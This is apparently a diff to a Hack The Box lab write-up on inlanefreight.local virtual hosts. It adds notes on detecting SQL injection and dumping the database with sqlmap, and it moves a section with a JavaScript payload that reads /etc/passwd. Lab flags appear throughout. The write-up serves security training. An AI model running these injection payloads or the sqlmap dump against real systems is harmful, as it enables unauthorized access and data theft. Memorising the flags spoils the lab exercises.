@@ -851,7 +851,11 @@ HTB{dbca4dc5d99cdb3311404ea74921553c}
 
 ## status.inlanefreight.local
 
-the request is captured
+By testing a `'` character the application already shows that there is a SQL syntax error, hinting towards a sql injection:
+
+![](./vhosts/status/status1.png)
+
+the request is captured with burp and passed to sqlmap for automated enueration:
 
 ```
 POST / HTTP/1.1
@@ -872,6 +876,8 @@ Priority: u=0, i
 searchitem=a
 
 ```
+
+Dumping the database reveals the flag:
 
 ```
 sqlmap -r status.txt --technique=BEU --batch --dump
@@ -949,23 +955,11 @@ Table: company
 
 ```
 
-## tracking.inlanefreight.local
-
-```javascript
-<script>
-  var x = new XMLHttpRequest();
-  x.open("GET", "file:///etc/passwd", false);
-  x.send();
-  document.write(x.responseText);
-</script>
-```
-
-HTB{49f0bad299687c62334182178bfd75d8}
-
-
-
 ## support.inlanefreight.local
 
+![](./vhosts/support/support1.png)
+
+the page is a support center 
 script.js:
 
 ```javascript
@@ -1027,5 +1021,22 @@ HTB{1nS3cuR3_c00k135}
 |9820|Nick|Resolved|
 |9819|Tom|Resolved|
 |9818|John|HTB{1nS3cuR3_c00k135}|
+
+
+
+## tracking.inlanefreight.local
+
+```javascript
+<script>
+  var x = new XMLHttpRequest();
+  x.open("GET", "file:///etc/passwd", false);
+  x.send();
+  document.write(x.responseText);
+</script>
+```
+
+HTB{49f0bad299687c62334182178bfd75d8}
+
+
 
 
